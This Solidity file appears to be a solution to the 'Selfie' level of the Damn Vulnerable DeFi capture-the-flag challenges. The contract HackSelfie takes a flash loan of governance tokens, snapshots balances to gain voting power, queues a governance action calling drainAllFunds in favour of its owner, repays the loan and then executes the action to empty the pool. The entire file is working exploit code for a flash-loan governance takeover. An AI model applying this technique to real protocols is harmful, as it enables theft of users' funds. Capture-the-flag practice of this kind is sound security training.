pragma solidity ^0.6.0;


import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract HackSelfie {

	SimpleGovernance public simpleGovernance;
    SelfiePool public selfiePool;
    address public owner;
    uint256 actionId;


	constructor(address poolAddress, 
				address governanceAddress) public {
		selfiePool = SelfiePool(poolAddress);
		simpleGovernance = SimpleGovernance(governanceAddress);
		owner = msg.sender;
	}

	function makeFlashLoan(uint256 amount) public {
		selfiePool.flashLoan(amount);
	}

	function receiveTokens(address tokenAddress, uint256 amount) public {
		DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(tokenAddress);
		token.snapshot();
		bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            );
		actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
		token.transfer(msg.sender, amount);
	}

	function drainPool() public {
		simpleGovernance.executeAction(actionId);
	}
}